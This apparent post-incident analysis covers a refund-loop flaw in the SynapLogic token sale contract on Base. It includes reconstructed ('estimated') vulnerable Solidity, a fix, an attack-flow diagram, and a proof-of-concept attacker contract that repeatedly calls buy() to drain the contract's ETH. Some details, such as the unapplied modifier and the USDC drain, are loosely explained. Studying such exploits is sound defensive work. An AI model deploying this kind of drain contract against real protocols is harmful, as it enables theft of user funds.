# SynapLogic — Business Logic Flaw in Refund Mechanism Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-20 |
| **Protocol** | SynapLogic |
| **Chain** | Base |
| **Loss** | ~27.6 ETH + ~3,450 USDC |
| **Attacker** | Unknown |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | SynapLogic token sale contract |
| **Root Cause** | The refund mechanism in the `buy()` function allows repeated refunds exceeding the original payment amount when combining multiple recipients/rates/refund flag combinations |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

The SynapLogic token sale contract contains a `buy()` function that includes logic to refund a partial amount under certain conditions during a purchase.

The vulnerability arises during the processing of `recipients`, `rates`, and `refundFlags` arrays passed as arguments to the `buy()` call. The structure refunds 10% of the original `value` on each iteration, but when multiple entries are passed, the refund executes independently for each entry — causing the total refund amount to exceed the original payment.

As a result, the attacker paid a small amount and drained all ETH and USDC held in the contract through repeated refunds.

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (Estimated)

```solidity
// ❌ Vulnerable: independent refund per iteration → total refund can exceed original payment
function buy(
    address[] calldata recipients,
    uint256[] calldata rates,
    bool[] calldata refundFlags
) external payable {
    uint256 value = msg.value;

    for (uint256 i = 0; i < recipients.length; i++) {
        // Token distribution logic
        uint256 tokenAmount = value * rates[i] / 100;
        _mint(recipients[i], tokenAmount);

        if (refundFlags[i]) {
            // ❌ Refunds 10% of value on every iteration
            // 10 recipients → value * 10% * 10 = full refund of value
            // 11 recipients → value * 10% * 11 > value (excess refund)
            uint256 refundAmount = value * 10 / 100;
            payable(recipients[i]).transfer(refundAmount);
        }
    }
}
```

### Fixed Code

```solidity
// ✅ Fixed: track total refunded to prevent exceeding payment amount
function buy(
    address[] calldata recipients,
    uint256[] calldata rates,
    bool[] calldata refundFlags
) external payable {
    uint256 value = msg.value;
    uint256 totalRefunded = 0;  // ✅ Track total refunded amount

    for (uint256 i = 0; i < recipients.length; i++) {
        uint256 tokenAmount = value * rates[i] / 100;
        _mint(recipients[i], tokenAmount);

        if (refundFlags[i]) {
            uint256 refundAmount = value * 10 / 100;
            // ✅ Prevent total refund from exceeding payment
            require(
                totalRefunded + refundAmount <= value,
                "Total refund exceeds payment"
            );
            totalRefunded += refundAmount;
            payable(recipients[i]).transfer(refundAmount);
        }
    }
}

// ✅ Added: input array length validation
modifier validArrayLengths(
    address[] calldata recipients,
    uint256[] calldata rates,
    bool[] calldata refundFlags
) {
    require(
        recipients.length == rates.length &&
        rates.length == refundFlags.length,
        "Array length mismatch"
    );
    require(recipients.length <= 10, "Too many recipients"); // ✅ Max 10 recipients
    _;
}
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─[1] Confirm SynapLogic contract balance: N ETH + M USDC
  │
  ├─[2] Craft manipulated buy() function parameters
  │       recipients = [addr1, addr2, ..., addr12] (12 entries)
  │       rates     = [8, 8, 8, ...]
  │       refundFlags = [true, true, true, ...]  (all refund enabled)
  │
  ├─[3] Call buy() with small ETH payment (e.g., 0.1 ETH)
  │       ┌─ Iteration 1:  refund = 0.1 ETH * 10% = 0.01 ETH
  │       ├─ Iteration 2:  refund = 0.1 ETH * 10% = 0.01 ETH
  │       ├─ ...
  │       └─ Iteration 12: refund = 0.1 ETH * 10% = 0.01 ETH
  │       Total refund = 0.12 ETH > 0.1 ETH (exceeds payment!)
  │
  ├─[4] Repeat
  │       Repeatedly call buy() to drain all contract ETH
  │
  ├─[5] Execute same pattern for USDC
  │       Use USDC refundFlags to drain USDC balance
  │
  └─[6] Result
        Attacker: +27.6 ETH + 3,450 USDC
        Contract: balance = 0
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISynapLogic {
    function buy(
        address[] calldata recipients,
        uint256[] calldata rates,
        bool[] calldata refundFlags
    ) external payable;
}

contract SynapLogicAttack {
    ISynapLogic constant target = ISynapLogic(0x...);

    function attack() external payable {
        // Set 12 recipients to trigger 120% refund
        address[] memory recipients = new address[](12);
        uint256[] memory rates = new uint256[](12);
        bool[] memory refundFlags = new bool[](12);

        for (uint256 i = 0; i < 12; i++) {
            recipients[i] = address(this); // Receive refunds at attacker address
            rates[i] = 8;                  // Token rate (96% total)
            refundFlags[i] = true;          // Enable refund for all entries
        }

        // Call buy() with small payment → receive 120% of payment as refund
        while (address(target).balance > 0) {
            uint256 payment = 0.01 ether;
            target.buy{value: payment}(recipients, rates, refundFlags);
            // Pay 0.01 ETH → receive 0.012 ETH refund (profit per iteration)
        }
    }

    // Receive ETH
    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Flaw |
| **Attack Vector** | Refund loop via parameter manipulation |
| **Impact Scope** | Full ETH and USDC balance of the contract |
| **DASP Classification** | Business Logic Error |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Critical |

### Detailed Description

This vulnerability is not a code-level bug but a **fundamental design flaw in the business logic**. The refund logic calculates independently per iteration rather than tracking the maximum refundable amount relative to the total payment. This pattern is immediately exploitable when the attacker can control the array length.

It is also notable that no flash loan was required for the attack. The contract was fully drained through pure logic exploitation alone.

---

## 6. Remediation Recommendations

1. **Add a total refund tracking variable**: Initialize `totalRefunded = 0` before the loop, accumulate on each refund, and revert if it exceeds `msg.value`
2. **Limit array length**: Enforce `recipients.length <= MAX_RECIPIENTS` to prevent gas and logic explosion
3. **Validate array length consistency**: Pre-validate that all input arrays have equal length
4. **Cap total refund rate**: Validate that the sum of all `rates` does not exceed 100%
5. **Strengthen unit tests**: Include boundary value test cases (maximum recipients, all refundFlags true)
6. **Review business logic during code audits**: Beyond technical vulnerabilities, verify the logical consistency of the economic model

---

## 7. Lessons Learned

- **Refund/reward logic must be validated against cumulative values**: Verifying the correctness of individual iterations without considering the total cumulative effect results in critical vulnerabilities.
- **User-controlled arrays are always dangerous**: Attackers can manipulate length, values, and combinations — strong input validation is essential.
- **Devastating attacks are possible without flash loans**: Business logic vulnerabilities can cause significant losses through pure logic exploitation without external capital.
- **Formal verification of economic models is necessary**: DeFi protocols require formal verification of mathematical invariants in addition to code audits.